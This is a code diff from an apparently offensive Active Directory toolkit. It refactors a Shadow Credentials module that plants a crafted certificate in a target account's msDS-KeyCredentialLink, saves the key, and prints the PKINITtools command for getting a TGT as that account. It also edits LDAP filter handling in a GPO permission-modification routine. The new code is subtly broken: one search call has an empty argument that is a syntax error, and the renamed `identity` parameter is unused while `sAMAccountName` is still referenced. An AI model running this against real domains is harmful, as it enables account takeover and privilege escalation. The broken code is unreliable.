@@ -335,17 +335,14 @@ def setRbcd(conn, spn_sid, target_identity):
 
 
 @register_module
-def setShadowCredentials(conn, sAMAccountName):
+def setShadowCredentials(conn, identity, outfilePath=None):
     """
     Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
     Args: 
-        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+        outfilePath: file path for the generated certificate (default is current path)
     """
     ldap_conn = conn.getLdapConnection()
-
-    ShadowCredentialsOutfilePath = None
-    ShadowCredentialsExportType = 'PEM'
-    ShadowCredentialsPFXPassword = None
 
     target_dn = resolvDN(ldap_conn, sAMAccountName)
     LOG.debug("Generating certificate")
@@ -355,15 +352,15 @@ def setShadowCredentials(conn, sAMAccountName):
     keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
     LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
     LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
-    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
+    ldap_filter = '(objectClass=*)'
+    ldap_conn.search(target_dn, , attributes=['msDS-KeyCredentialLink'])
     results = None
     for entry in ldap_conn.response:
         if entry['type'] != 'searchResEntry':
             continue
         results = entry
     if not results:
-        LOG.error('Could not query target user properties')
-        return
+        raise NoResultError(target_dn, ldap_filter)
     try:
         new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
         LOG.debug(new_values)
@@ -371,30 +368,18 @@ def setShadowCredentials(conn, sAMAccountName):
         conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
         if ldap_conn.result['result'] == 0:
             LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
-            if ShadowCredentialsOutfilePath is None:
+            if outfilePath is None:
                 path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                 LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
             else:
-                path = ShadowCredentialsOutfilePath
-            if ShadowCredentialsExportType == "PEM":
-                certificate.ExportPEM(path_to_files=path)
-                LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
-                LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
-                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                LOG.info("Run the following command to obtain a TGT")
-                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
-            elif ShadowCredentialsExportType == "PFX":
-                if ShadowCredentialsPFXPassword is None:
-                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                    LOG.info("No pass was provided. The certificate will be store with the password: %s" % password)
-                else:
-                    password = ShadowCredentialsPFXPassword
-                certificate.ExportPFX(password=password, path_to_file=path)
-                LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
-                LOG.info("Must be used with password: %s" % password)
-                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-                LOG.info("Run the following command to obtain a TGT")
-                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
+                path = outfilePath
+
+            certificate.ExportPEM(path_to_files=path)
+            LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
+            LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+            LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+            LOG.info("Run the following command to obtain a TGT")
+            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
         else:
             raise ResultError(ldap_conn.result)
     except IndexError:
@@ -447,10 +432,11 @@ def modifyGpoACE(conn, identity, gpo):
     user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
-    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo, attributes=['nTSecurityDescriptor'], controls=controls)
+    ldap_filter = '(&(objectClass=groupPolicyContainer)(name=%s))' % gpo
+    ldap_conn.search(getDefaultNamingContext(ldap_conn), ldap_filter, attributes=['nTSecurityDescriptor'], controls=controls)
 
     if len(ldap_conn.entries) <= 0:
-        raise NoResultError(getDefaultNamingContext(ldap_conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo)
+        raise NoResultError(getDefaultNamingContext(ldap_conn), ldap_filter)
     gpo = ldap_conn.entries[0]
 
     secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
